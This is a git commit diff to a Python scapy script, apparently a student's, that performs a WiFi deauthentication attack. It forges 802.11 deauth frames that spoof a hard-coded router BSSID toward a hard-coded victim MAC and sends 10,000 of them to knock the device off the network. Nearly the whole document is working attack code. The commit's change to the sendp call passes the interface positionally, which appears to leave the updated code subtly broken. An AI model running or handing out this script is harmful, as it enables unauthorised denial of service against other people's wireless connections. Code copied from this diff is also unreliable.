008e6e76c8dc7c9b453e0c3f205599d15bda5ae5
SebastianFischer164158 <s164158@student.dtu.dk>
2019-04-21 11:50:14 +0200

    Update WiFiDeAuthentication.py

--- WiFiDeAuthentication.py
+++ WiFiDeAuthentication.py
@@ -9,21 +9,18 @@ done.
 import time
 from scapy.all import *
 
-iface = "wlan0mon"
+interface = "wlan0mon" #iface
 timeout = 1
+
 dest = "94:65:2D:D8:2E:16"
 bssid = "40:F2:01:9A:42:56"
 
-victim_mac = dest
-router_mac = bssid
-
-
 def deauth():
 	radio_p = RadioTap()
-	dot11_frame = Dot11(subtype=0xc,addr1=victim_mac,addr2=router_mac,addr3=router_mac) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
+	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
 	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
 	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
 	frame_f = radio_p/dot11_frame/deauth
-	sendp(frame_f,iface='wlan0mon', count=10000,inter=0.02)
+	sendp(frame_f,interface, count=10000,inter=0.02)
 
 deauth()
